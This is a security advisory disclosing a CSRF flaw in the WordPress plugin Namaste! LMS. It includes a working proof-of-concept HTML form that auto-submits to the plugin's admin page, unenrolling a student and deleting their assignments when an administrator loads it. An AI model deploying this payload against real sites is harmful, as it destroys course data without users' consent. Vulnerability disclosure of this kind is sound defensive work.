# CSRF Vulnerability in WordPress Plugin "Namaste! LMS"

A **Cross-Site Request Forgery (CSRF)** vulnerability was identified in the WordPress plugin **Namaste! LMS**. This vulnerability allows an attacker to force an authenticated user with sufficient permissions to unenroll a student from a course. This action also leads to the deletion of all lesson assignments associated with that student, causing potential data loss and disruption.

## Vulnerability Overview

The CSRF vulnerability is located in the unenrollment functionality of the Namaste! LMS plugin. Through this flaw, an attacker could craft a malicious link or form that, when visited by an authenticated administrator or teacher, would trigger actions on behalf of the user. Specifically, the attacker can:

1. **Unenroll a student** from a course.
2. **Delete all lesson assignments** associated with that student, resulting in data loss.

The vulnerability can be exploited by embedding a crafted link or form on an external website or in an email, causing harm to the student's progress without their knowledge.

## Impact

1. Loss of student progress and assignments.
2. Potential frustration and disruption for students and administrators.
3. Compromised integrity of course data.

---

## Proof of Concept (PoC)

To demonstrate this vulnerability, follow the steps below:

1. **Log in** with a student account.
2. **Enroll in a course** and submit an assignment.
3. **Log in** to the WordPress site as an administrator or teacher.
4. Host the following CSRF payload, adjusting the `student_id` and `course_id` as needed.

```html
<html>
  <body>
    <form action="http://localhost/wordpress6.6.2/wp-admin/admin.php">
      <input type="hidden" name="page" value="namaste_students" />
      <input type="hidden" name="course_id" value="6" />
      <input type="hidden" name="status" value="" />
      <input type="hidden" name="cleanup" value="1" />
      <input type="hidden" name="student_id" value="2" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState("", "", "/");
      document.forms[0].submit();
    </script>
  </body>
</html>
```

5. Send the link to the administrator.
6. Upon loading the page, the CSRF payload will trigger the unenrollment of the targeted student from the specified course, resulting in the deletion of all their assignments.

## Expected vs. Actual Results

- **Expected Result**: The unenrollment action should require explicit user consent, with CSRF token validation to prevent unauthorized requests.
- **Actual Result**: The unenrollment action can be executed without the user's explicit consent, resulting in unauthorized unenrollment and assignment deletion.
